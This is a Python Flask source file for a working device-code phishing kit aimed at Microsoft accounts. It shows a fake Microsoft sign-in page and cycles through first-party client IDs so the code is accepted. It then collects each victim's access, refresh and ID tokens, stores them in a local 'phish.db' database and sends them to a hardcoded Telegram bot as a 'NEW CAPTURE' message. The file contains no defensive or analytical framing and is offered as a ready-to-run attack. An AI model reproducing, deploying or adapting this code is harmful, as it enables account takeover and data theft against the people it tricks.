import os
import time
import uuid
import sqlite3
import base64
import json
import requests
from flask import Flask, request, jsonify, render_template_string
from threading import Thread

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"
TENANT = "common"

# Order matters. Graph-preauthorized first-party clients FIRST.
# 65002 only bites clients that are NOT preauthorized for Graph (e.g. Azure PowerShell).
CLIENT_IDS = [
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office  -> Graph OK
    "ab9b8c07-8f02-4f72-87fa-80105867a763",  # OneDrive Sync     -> Graph OK
    "1fec8e78-bce4-4aaf-ab1b-5451cc387264",  # Microsoft Teams   -> Graph OK
    "27922004-5251-4030-b22d-91ecd9a37ea4",  # Outlook Mobile    -> Graph OK
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell  -> ARM only, keep as last resort
]
CLIENT_INDEX = 0

# Graph ".default" = use the first-party app's preauthorized permissions.
# This is the trick that prevents AADSTS65002.
GRAPH_SCOPE = "openid profile offline_access https://graph.microsoft.com/.default"

DB_PATH = "/tmp/phish.db"

app = Flask(__name__)

# --- DATABASE ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id TEXT PRIMARY KEY,
        client_id TEXT,
        device_code TEXT,
        user_code TEXT,
        verification_uri TEXT,
        status TEXT DEFAULT 'pending',
        access_token TEXT,
        refresh_token TEXT,
        id_token TEXT,
        created_at REAL,
        note TEXT
    )''')
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

init_db()

# --- HELPERS ---
def next_client():
    global CLIENT_INDEX
    cid = CLIENT_IDS[CLIENT_INDEX]
    CLIENT_INDEX = (CLIENT_INDEX + 1) % len(CLIENT_IDS)
    return cid

def initiate_device_flow():
    """Try each first-party client until one returns a usable device code."""
    attempts = 0
    while attempts < len(CLIENT_IDS):
        client_id = next_client()
        try:
            resp = requests.post(
                f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode",
                data={"client_id": client_id, "scope": GRAPH_SCOPE},
                timeout=15
            )
            if resp.status_code == 200:
                data = resp.json()
                data["client_id"] = client_id
                print(f"[FLOW OK] client={client_id}")
                return data
            print(f"[FLOW FAIL {resp.status_code}] {client_id} -> {resp.text[:200]}")
        except Exception as e:
            print(f"[FLOW EXCEPT] {e}")
        attempts += 1
    return None

def poll_auth_status(device_code, client_id):
    """Poll MS token endpoint until success / failure. Runs in background thread."""
    start = time.time()
    interval = 5
    while time.time() - start < 900:  # 15 min max
        try:
            resp = requests.post(
                f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
                data={
                    "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                    "device_code": device_code,
                    "client_id": client_id,
                },
                timeout=15
            )
            data = resp.json()

            if resp.status_code == 200:
                access_token = data.get("access_token", "")
                refresh_token = data.get("refresh_token", "")
                id_token = data.get("id_token", "")
                email = extract_email(id_token)

                conn = get_db()
                conn.execute(
                    "UPDATE sessions SET status=?, access_token=?, refresh_token=?, id_token=? WHERE device_code=?",
                    ("completed", access_token, refresh_token, id_token, device_code)
                )
                conn.commit(); conn.close()

                send_telegram(email, access_token, refresh_token, id_token)
                return

            err = data.get("error", "")
            desc = data.get("error_description", "")

            if err == "authorization_pending":
                time.sleep(interval)
                continue
            if err == "slow_down":
                interval += 5
                time.sleep(interval)
                continue

            # AADSTS65002 at token time -> mark failed, caller can auto-retry new client
            note = "65002" if "65002" in desc else err
            conn = get_db()
            conn.execute("UPDATE sessions SET status=?, note=? WHERE device_code=?",
                         ("failed", note, device_code))
            conn.commit(); conn.close()
            print(f"[POLL END] {err} {desc[:120]}")
            return

        except Exception as e:
            print(f"[POLL EXCEPT] {e}")
            time.sleep(interval)

def extract_email(id_token):
    """Decode id_token payload to pull the UPN/preferred_username."""
    try:
        parts = id_token.split(".")
        if len(parts) != 3:
            return "unknown"
        payload = parts[1] + "=" * (-len(parts[1]) % 4)
        claims = json.loads(base64.urlsafe_b64decode(payload))
        return claims.get("preferred_username") or claims.get("upn") or claims.get("email") or "unknown"
    except Exception:
        return "unknown"

def send_telegram(email, at, rt, it):
    text = (
        f"🎯 <b>NEW CAPTURE</b>\n"
        f"👤 <b>Email:</b> <code>{email}</code>\n\n"
        f"🔑 <b>Access Token:</b>\n<code>{at}</code>\n\n"
        f"🔄 <b>Refresh Token:</b>\n<code>{rt}</code>\n\n"
        f"🆔 <b>ID Token:</b>\n<code>{it}</code>"
    )
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": text,
                  "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=15
        )
    except Exception as e:
        print(f"[TG EXCEPT] {e}")

# --- HTML ---
HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your account</title>
<style>
  body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
  .container{background:#fff;width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2);border-radius:2px}
  .logo img{height:24px}
  h1{font-size:24px;font-weight:600;margin:16px 0 8px;color:#1b1b1b}
  p{font-size:15px;color:#1b1b1b;margin:0 0 20px}
  .code-box{background:#f2f2f2;padding:15px;font-size:24px;font-weight:700;text-align:center;letter-spacing:2px;margin-bottom:20px;border:1px solid #ccc;cursor:pointer}
  .btn{background:#0067b8;color:#fff;border:0;padding:12px 24px;font-size:15px;font-weight:600;cursor:pointer;width:100%;border-radius:2px}
  .btn:disabled{background:#9bb8cc;cursor:default}
  .btn:hover:enabled{background:#005da6}
  .footer{margin-top:30px;font-size:12px;color:#666;text-align:center}
  .error{color:#c00;font-size:14px;margin-top:10px;display:none}
</style>
</head>
<body>
<div class="container">
  <div class="logo"><img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" alt="Microsoft"></div>
  <h1>Sign in</h1>
  <p>To sign in, use the code shown below.</p>
  <div id="code-display" class="code-box" onclick="copyCode()">LOADING...</div>
  <button id="action-btn" class="btn" onclick="openLogin()" disabled>Open Microsoft Login</button>
  <div id="error-msg" class="error"></div>
  <div class="footer"><p>No longer have access to this device? <a href="#" style="color:#0067b8;text-decoration:none;">Try another way</a></p></div>
</div>
<script>
let s=null, tries=0;
async function init(){
  try{
    const r=await fetch('/create-session');
    s=await r.json();
    if(s.error){ document.getElementById('code-display').innerText='Retry...'; setTimeout(init,1500); return; }
    document.getElementById('code-display').innerText=s.user_code;
    const b=document.getElementById('action-btn'); b.disabled=false; b.innerText='Copy Code & Sign In';
    setInterval(check,3000);
  }catch(e){ setTimeout(init,2000); }
}
function copyCode(){
  if(!s) return;
  navigator.clipboard.writeText(s.user_code).catch(()=>{});
  const b=document.getElementById('action-btn');
  b.innerText='Code Copied! Click to Continue'; b.style.background='#107c10';
}
function openLogin(){
  if(!s) return;
  navigator.clipboard.writeText(s.user_code).catch(()=>{});
  window.location.href=s.verification_uri;
}
async function check(){
  if(!s) return;
  try{
    const r=await fetch('/status/'+s.device_code);
    const d=await r.json();
    if(d.status==='completed'){
      document.querySelector('.container').innerHTML='<h1 style="text-align:center;color:#107c10">Success!</h1><p style="text-align:center">You may close this window.</p>';
    } else if(d.status==='failed'){
      // auto-retry with next client (handles 65002/expired codes)
      if(tries++ < 4){
        document.getElementById('code-display').innerText='Refreshing...';
        setTimeout(init, 800);
      } else {
        const e=document.getElementById('error-msg');
        e.innerText='Login failed or expired. Please refresh the page.';
        e.style.display='block';
      }
    }
  }catch(e){}
}
init();
</script>
</body>
</html>
"""

# --- ROUTES ---
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/create-session')
def create_session():
    flow = initiate_device_flow()
    if not flow:
        return jsonify({"error": "No client accepted the device code request."}), 500

    sid = str(uuid.uuid4())
    conn = get_db()
    conn.execute(
        "INSERT INTO sessions (id, client_id, device_code, user_code, verification_uri, created_at) VALUES (?,?,?,?,?,?)",
        (sid, flow["client_id"], flow["device_code"], flow["user_code"], flow["verification_uri"], time.time())
    )
    conn.commit(); conn.close()

    t = Thread(target=poll_auth_status, args=(flow["device_code"], flow["client_id"]))
    t.daemon = True
    t.start()

    return jsonify({
        "device_code": flow["device_code"],
        "user_code": flow["user_code"],
        "verification_uri": flow["verification_uri"],
        "client_id": flow["client_id"]
    })

@app.route('/status/<device_code>')
def status(device_code):
    conn = get_db()
    row = conn.execute("SELECT status, note FROM sessions WHERE device_code=?", (device_code,)).fetchone()
    conn.close()
    if row:
        return jsonify({"status": row["status"], "note": row["note"]})
    return jsonify({"status": "not_found"}), 404

@app.route('/health')
def health():
    return jsonify({"client_index": CLIENT_INDEX, "scope": GRAPH_SCOPE, "clients": CLIENT_IDS})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=False)
